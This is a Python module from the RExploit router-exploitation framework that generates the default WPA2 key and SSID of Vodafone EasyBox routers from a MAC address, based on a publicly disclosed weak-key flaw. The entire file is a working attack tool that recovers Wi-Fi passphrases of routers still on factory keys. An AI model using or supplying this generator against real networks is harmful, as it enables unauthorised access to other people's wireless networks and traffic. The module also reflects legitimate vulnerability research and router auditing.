# coding=utf-8
from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="EasyBox Standard WPA2 Key Generator ",
            category="generator",
            authors={
                "Sebastian Petters": "Vulnerability discovery",
                "Ján Trenčanský": "RExploit module"
            },
            date="13/06/2015",
            cwe="CWE-310: Cryptographic Issues",
            targets=[
                "EasyBox"
            ],
            references={
                "http://www.ph-neutral.darklab.org ": "DarkLab"
            },
            description="Generates WPA2 Key for Vodafone easybox. Based on routerpwn.com easyboxwpa()"
        )

    def run(self, mac):
        mac = mac.replace(":", "")
        mac = mac.replace("-", "")

        c1 = str(int(mac[8:], 16))

        while len(c1) < 5:
            c1 = "0" + c1

        s6 = int(c1[0], 16)
        s7 = int(c1[1], 16)
        s8 = int(c1[2], 16)
        s9 = int(c1[3], 16)
        s10 = int(c1[4], 16)
        m7 = int(mac[6], 16)
        m8 = int(mac[7], 16)
        m9 = int(mac[8], 16)
        m10 = int(mac[9], 16)
        m11 = int(mac[10], 16)
        m12 = int(mac[11], 16)

        k1 = (s7 + s8 + m11 + m12) & 0x0F
        k2 = (m9 + m10 + s9 + s10) & 0x0F

        x1 = k1 ^ s10
        x2 = k1 ^ s9
        x3 = k1 ^ s8
        y1 = k2 ^ m10
        y2 = k2 ^ m11
        y3 = k2 ^ m12
        z1 = m11 ^ s10
        z2 = m12 ^ s9
        z3 = k1 ^ k2

        ssid = "EasyBox-" + format(m7, 'x') + format(m8, 'x') + format(m9, 'x') \
               + format(m10, 'x') + format(s6, 'x') + format(s10, 'x')

        key = format(x1, 'x') + format(y1, 'x') + format(z1, 'x') + \
              format(x2, 'x') + format(y2, 'x') + format(z2, 'x') + \
              format(x3, 'x') + format(y3, 'x') + format(z3, 'x')

        return "{0} - {1}".format(key.upper(), ssid)
